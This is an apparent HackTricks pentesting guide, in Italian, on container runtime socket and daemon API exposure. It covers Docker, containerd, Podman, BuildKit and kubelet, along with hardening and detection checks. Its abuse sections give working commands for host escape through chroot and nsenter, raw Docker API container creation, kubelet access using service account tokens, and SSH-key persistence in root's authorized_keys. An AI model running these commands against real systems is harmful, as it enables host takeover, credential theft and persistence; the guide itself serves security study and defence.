# Esposizione delle API di runtime e dei daemon

{{#include ../../../banners/hacktricks-training.md}}

## Panoramica

Molte compromissioni reali dei container non iniziano affatto con una namespace escape. Iniziano con l'accesso al piano di controllo del runtime. Se un workload può comunicare con `dockerd`, `containerd`, CRI-O, Podman o kubelet tramite un socket Unix montato o un listener TCP esposto, l'attaccante potrebbe riuscire a richiedere un nuovo container con privilegi maggiori, montare il filesystem dell'host, unirsi ai namespace dell'host o recuperare informazioni sensibili sul nodo. In questi casi, l'API del runtime è il vero confine di sicurezza e comprometterla equivale, di fatto, a compromettere l'host.

Ecco perché l'esposizione dei socket del runtime dovrebbe essere documentata separatamente dalle protezioni del kernel. Un container con seccomp, capabilities e confinamento MAC ordinari può comunque trovarsi a una chiamata API dalla compromissione dell'host se al suo interno è montato `/var/run/docker.sock` o `/run/containerd/containerd.sock`. L'isolamento del kernel del container in uso può funzionare esattamente come previsto, mentre il piano di gestione del runtime rimane completamente esposto.

## Modelli di accesso ai daemon

Docker Engine espone tradizionalmente la propria API privilegiata tramite il socket Unix locale `unix:///var/run/docker.sock`. Storicamente, è stato esposto anche da remoto tramite listener TCP, come `tcp://0.0.0.0:2375`, o tramite un listener protetto da TLS sulla porta `2376`. Esporre il daemon da remoto senza TLS robusto e autenticazione dei client trasforma di fatto l'API Docker in un'interfaccia root remota.

containerd, CRI-O, Podman e kubelet espongono superfici altrettanto critiche. I nomi e i workflow cambiano, ma la logica resta la stessa. Se l'interfaccia consente al chiamante di creare workload, montare percorsi dell'host, recuperare credenziali o modificare container in esecuzione, è un canale di gestione privilegiato e va trattato come tale.

Un'interfaccia web per la gestione dei container può esporre lo stesso confine senza concedere all'account locale accesso diretto al socket. Per esempio, [il problema #493 di Portainer](https://github.com/portainer/portainer/issues/493) documentava il ripristino non autenticato della password di amministratore in una versione legacy 1.11.1. Considera un'interfaccia raggiungibile localmente solo come spunto per una verifica: controlla la build installata e il comportamento dell'autenticazione, l'effettivo controllo amministrativo e se l'endpoint gestito può creare container con un bind mount scrivibile dell'host. [La documentazione di Portainer](https://docs.portainer.io/admin/environments/add/docker/socket) specifica che la gestione basata su socket richiede l'accesso al socket Docker; un endpoint rootless o con restrizioni cambia l'impatto sull'host. Non dedurre la presenza della vulnerabilità di autenticazione o l'accesso root all'host basandoti soltanto sul nome di un processo, una porta o una stringa di versione.

Tra i percorsi locali comuni da verificare ci sono:

```text
/var/run/docker.sock
/run/docker.sock
/run/containerd/containerd.sock
/var/run/crio/crio.sock
/run/podman/podman.sock
/var/run/kubelet.sock
/run/buildkit/buildkitd.sock
/run/firecracker-containerd.sock
```

Stack più datati o specializzati possono esporre anche endpoint come `dockershim.sock`, `frakti.sock` o `rktlet.sock`. Sono meno comuni negli ambienti moderni, ma quando li si incontra occorre trattarli con la stessa cautela, perché rappresentano superfici di controllo del runtime e non normali socket applicativi.

## Secure Remote Access

Se un daemon deve essere esposto oltre il socket locale, la connessione dovrebbe essere protetta con TLS e, preferibilmente, con autenticazione reciproca, in modo che il daemon verifichi il client e il client verifichi il daemon. La vecchia abitudine di esporre il daemon Docker su HTTP semplice per comodità è uno degli errori più pericolosi nell’amministrazione dei container, perché la superficie API è abbastanza potente da consentire la creazione diretta di container con privilegi elevati.

Il modello storico di configurazione di Docker era simile a questo:

```bash
DOCKER_OPTS="-H unix:///var/run/docker.sock -H tcp://192.168.56.101:2376"
sudo service docker restart
```

Sugli host basati su systemd, la comunicazione con il daemon può apparire anche come `fd://`, il che significa che il processo eredita un socket già aperto da systemd, invece di associarlo direttamente. La lezione importante non riguarda la sintassi esatta, ma le conseguenze per la sicurezza. Non appena il daemon è in ascolto al di fuori di un socket locale con permessi rigorosi, la sicurezza del trasporto e l'autenticazione dei client diventano obbligatorie, non più misure di hardening facoltative.

## Abuso

Se è presente un socket runtime, verifica quale sia, se esiste un client compatibile e se è possibile accedere tramite HTTP grezzo o gRPC:

```bash
find / -maxdepth 3 \( -name docker.sock -o -name containerd.sock -o -name crio.sock -o -name podman.sock -o -name kubelet.sock \) 2>/dev/null
ss -xl | grep -E 'docker|containerd|crio|podman|kubelet' 2>/dev/null
docker -H unix:///var/run/docker.sock version 2>/dev/null
podman --url unix:///run/podman/podman.sock info 2>/dev/null
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io ps 2>/dev/null
ctr --address /run/containerd/containerd.sock images ls 2>/dev/null
crictl --runtime-endpoint unix:///run/containerd/containerd.sock ps 2>/dev/null
crictl --runtime-endpoint unix:///var/run/crio/crio.sock ps 2>/dev/null
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers 2>/dev/null
```

Questi comandi sono utili perché permettono di distinguere tra un percorso inesistente, un socket montato ma inaccessibile e un’API privilegiata attiva. Se il client ha successo, la domanda successiva è se l’API può avviare un nuovo container con un bind mount dell’host o condividendo un namespace dell’host.

### Quando non è installato alcun client

L’assenza di `docker`, `podman` o di un’altra CLI intuitiva non significa che il socket sia sicuro. Docker Engine comunica tramite HTTP sul suo socket Unix e Podman espone sia un’API compatibile con Docker sia un’API nativa Libpod tramite `podman system service`. Questo significa che potrebbe bastare un ambiente minimale con solo `curl` per interagire con il daemon:

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock http://localhost/v1.54/images/json
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["id"],"HostConfig":{"Binds":["/:/host"]}}' \
  -X POST http://localhost/v1.54/containers/create

curl --unix-socket /run/podman/podman.sock http://d/_ping
curl --unix-socket /run/podman/podman.sock http://d/v1.40.0/images/json
```

Per l'esecuzione di codice PHP vincolata da `open_basedir`, [le connessioni ai socket Unix restano una via separata](../../../network-services-pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass/#unix-sockets-outside-open_basedir) se il processo PHP dispone dei permessi OS per connettersi.

Questo è importante durante il post-exploitation, perché a volte i difensori rimuovono i consueti client binary ma lasciano montato il socket di gestione. Sugli host Podman, ricordate che il percorso di maggior valore è diverso per le deployment rootful e rootless: `unix:///run/podman/podman.sock` per le istanze del servizio rootful e `unix://$XDG_RUNTIME_DIR/podman/podman.sock` per quelle rootless.

### Esempio completo: dal socket Docker a root sull'host

Se `docker.sock` è raggiungibile, il classico escape consiste nell'avviare un nuovo container che monta il filesystem root dell'host e poi eseguire `chroot` al suo interno:

```bash
docker -H unix:///var/run/docker.sock images
docker -H unix:///var/run/docker.sock run --rm -it -v /:/host ubuntu:24.04 chroot /host /bin/bash
```

Questo consente l’esecuzione diretta come root sull’host tramite il daemon Docker. L’impatto non si limita alla lettura dei file. Una volta all’interno del nuovo container, l’attaccante può modificare i file dell’host, sottrarre credenziali, installare meccanismi di persistenza o avviare altri workload privilegiati.

### Esempio completo: dal socket Docker ai namespace dell’host

Se l’attaccante preferisce entrare nei namespace invece di limitarsi all’accesso al filesystem:

```bash
docker -H unix:///var/run/docker.sock run --rm -it --pid=host --privileged ubuntu:24.04 bash
nsenter --target 1 --mount --uts --ipc --net --pid -- bash
```

Questo percorso raggiunge l’host chiedendo al runtime di creare un nuovo container con un’esposizione esplicita dei namespace dell’host, anziché sfruttare quello corrente.

### Docker Socket Persistence Pattern

Il controllo del runtime può essere usato anche per la persistenza, anziché per ottenere una shell una tantum. Lo schema generico consiste nel creare un container helper con un mount dell’host, scrivere materiale di accesso autorizzato o un hook di avvio nel filesystem dell’host montato e poi verificare che l’host lo utilizzi.

Esempio:

```bash
docker -H unix:///var/run/docker.sock run -d --name helper -v /:/host ubuntu:24.04 sleep infinity
docker -H unix:///var/run/docker.sock exec helper sh -c 'mkdir -p /host/root/.ssh && chmod 700 /host/root/.ssh'
docker -H unix:///var/run/docker.sock cp ./id_ed25519.pub helper:/tmp/key.pub
docker -H unix:///var/run/docker.sock exec helper sh -c 'cat /tmp/key.pub >>/host/root/.ssh/authorized_keys'
```

La stessa idea può essere usata per modificare unità systemd, frammenti cron, file di avvio delle applicazioni o chiavi SSH, a seconda di ciò che l'operatore vuole dimostrare. Il punto importante è che la modifica persistente viene effettuata tramite l'autorità del daemon runtime sul filesystem dell'host, non tramite privilegi aggiuntivi nel container originale.

### Raw Docker API Helper Pivot

Quando manca la Docker CLI, lo stesso flusso con helper e mount dell'host può essere eseguito tramite HTTP sul socket Unix. Il flusso generico è: verificare l'API, creare un container helper con un bind mount dell'host, avviarlo, creare un'istanza exec e avviare tale exec.

```bash
curl --unix-socket /var/run/docker.sock http://localhost/_ping
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"Image":"ubuntu:24.04","Cmd":["sleep","3600"],"HostConfig":{"Binds":["/:/host:rw"]}}' \
  -X POST http://localhost/v1.54/containers/create?name=helper
curl --unix-socket /var/run/docker.sock -X POST http://localhost/v1.54/containers/helper/start
curl --unix-socket /var/run/docker.sock \
  -H 'Content-Type: application/json' \
  -d '{"AttachStdout":true,"AttachStderr":true,"Cmd":["chroot","/host","id"]}' \
  -X POST http://localhost/v1.54/containers/helper/exec
```

La richiesta finale `/exec/<id>/start` dipende dall'ID exec restituito, ma il punto relativo alla sicurezza non dipende dai dettagli esatti del JSON: l'accesso diretto all'API di un daemon Docker rootful è sufficiente per richiedere un workload helper più privilegiato.

### Esempio completo: socket containerd

Un socket `containerd` montato è di solito altrettanto pericoloso:<sup>[[1]](#references)</sup>

```bash
ctr --address /run/containerd/containerd.sock images pull docker.io/library/busybox:latest
ctr --address /run/containerd/containerd.sock run --tty --privileged --mount type=bind,src=/,dst=/host,options=rbind:rw docker.io/library/busybox:latest host /bin/sh
chroot /host /bin/sh
```

Se è disponibile un client più simile a Docker, `nerdctl` può essere più pratico di `ctr` perché espone opzioni familiari come `--privileged`, `--pid=host` e `-v`:

```bash
nerdctl --address /run/containerd/containerd.sock --namespace k8s.io run --rm -it \
  --privileged --pid=host -v /:/host docker.io/library/alpine:latest sh
chroot /host /bin/sh
```

L'impatto è ancora una volta la compromissione dell'host. Anche se gli strumenti specifici di Docker non sono presenti, un'altra API runtime potrebbe comunque offrire lo stesso potere amministrativo. Sui nodi Kubernetes, anche `crictl` potrebbe bastare per la ricognizione e l'interazione con i container, perché comunica direttamente con l'endpoint CRI.

### Socket BuildKit

È facile non accorgersi di `buildkitd`, perché spesso lo si considera «solo il backend di build», ma il daemon è comunque un piano di controllo privilegiato. Un `buildkitd.sock` raggiungibile può consentire a un attaccante di eseguire passaggi di build arbitrari, ispezionare le capacità dei worker, usare i contesti locali dell'ambiente compromesso e richiedere entitlement pericolosi come `network.host` o `security.insecure`, se il daemon è stato configurato per consentirli.

Le prime interazioni utili sono:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock debug workers
buildctl --addr unix:///run/buildkit/buildkitd.sock du
```

Se il daemon accetta richieste di build, verifica se sono disponibili entitlements non sicuri:

```bash
buildctl --addr unix:///run/buildkit/buildkitd.sock build \
  --frontend dockerfile.v0 \
  --local context=. \
  --local dockerfile=. \
  --allow network.host \
  --allow security.insecure \
  --output type=local,dest=/tmp/buildkit-out
```

L’impatto esatto dipende dalla configurazione del daemon, ma un servizio BuildKit rootful con entitlements permissivi non è una semplice comodità innocua per gli sviluppatori. Consideralo un’altra superficie amministrativa di alto valore, soprattutto sui runner CI e sui nodi di build condivisi.

### API del kubelet su TCP

Il kubelet non è un container runtime, ma fa comunque parte del piano di gestione dei nodi e spesso rientra nelle stesse discussioni sui confini di fiducia. Se la porta sicura `10250` del kubelet è raggiungibile dal workload, oppure se vengono esposte credenziali dei nodi, kubeconfig o autorizzazioni proxy, l’attaccante potrebbe riuscire a enumerare i Pod, recuperare i log o eseguire comandi nei container locali al nodo senza mai passare dal percorso di ammissione dell’API server Kubernetes.

Inizia con una ricognizione rapida:

```bash
curl -sk https://127.0.0.1:10250/pods
curl -sk https://127.0.0.1:10250/runningpods/
TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null)
curl -sk -H "Authorization: Bearer $TOKEN" https://127.0.0.1:10250/pods
```

Se il percorso proxy di kubelet o API-server autorizza `exec`, un client compatibile con WebSocket può trasformarlo in esecuzione di codice in altri container sul nodo. È anche per questo che `nodes/proxy` con il solo permesso `get` è più pericoloso di quanto sembri: la richiesta può comunque raggiungere endpoint di kubelet che eseguono comandi, e queste interazioni dirette con kubelet non compaiono nei normali log di audit di Kubernetes.<sup>[[2]](#references)</sup>

## Controlli

L'obiettivo di questi controlli è stabilire se il container può raggiungere un piano di gestione che avrebbe dovuto rimanere al di fuori del confine di fiducia.

```bash
mount | grep -E '/var/run|/run|docker.sock|containerd.sock|crio.sock|podman.sock|kubelet.sock'
ss -lntp 2>/dev/null | grep -E ':2375|:2376'
env | grep -E 'DOCKER_HOST|CONTAINERD_ADDRESS|CRI_CONFIG_FILE|BUILDKIT_HOST|XDG_RUNTIME_DIR'
find /run /var/run -maxdepth 3 \( -name 'buildkitd.sock' -o -name 'podman.sock' \) 2>/dev/null
```

Cosa c'è di interessante qui:

- Un socket runtime montato è solitamente una primitiva amministrativa diretta, non una semplice divulgazione di informazioni.
- Un listener TCP sulla porta `2375` senza TLS dovrebbe essere considerato una condizione di compromissione remota.
- Variabili d'ambiente come `DOCKER_HOST` spesso rivelano che il workload è stato progettato intenzionalmente per comunicare con il runtime dell'host.

## Impostazioni predefinite del runtime

| Runtime / piattaforma | Stato predefinito | Comportamento predefinito | Indebolimenti manuali comuni |
| --- | --- | --- | --- |
| Docker Engine | Socket Unix locale per impostazione predefinita | `dockerd` è in ascolto sul socket locale e il daemon di solito dispone dei privilegi di root | montare `/var/run/docker.sock`, esporre `tcp://...:2375`, TLS debole o assente su `2376` |
| Podman | CLI senza daemon per impostazione predefinita | Per il normale utilizzo locale non è richiesto alcun daemon privilegiato di lunga durata; i socket API possono comunque essere esposti quando è abilitato `podman system service` | esporre `podman.sock`, eseguire il servizio in modo esteso, utilizzare l'API con privilegi di root |
| containerd | Socket locale privilegiato | API amministrativa esposta tramite il socket locale e solitamente utilizzata da strumenti di livello superiore | montare `containerd.sock`, accesso esteso a `ctr` o `nerdctl`, esporre namespace privilegiati |
| CRI-O | Socket locale privilegiato | L'endpoint CRI è destinato ai componenti attendibili locali al nodo | montare `crio.sock`, esporre l'endpoint CRI a workload non attendibili |
| Kubernetes kubelet | API di gestione locale al nodo | Kubelet non dovrebbe essere ampiamente raggiungibile dai Pod; a seconda di authn/authz, l'accesso può esporre lo stato dei Pod, credenziali e funzionalità di esecuzione | montare socket o certificati kubelet, autenticazione kubelet debole, rete host e endpoint kubelet raggiungibile |



## References

- [1] [Sfruttamento del socket containerd, parte 1](https://thegreycorner.com/2025/02/12/containerd-socket-exploitation-part-1.html)
- [2] [Rischi di bypass dell'API Server di Kubernetes](https://kubernetes.io/docs/concepts/security/api-server-bypass-risks/)
{{#include ../../../banners/hacktricks-training.md}}
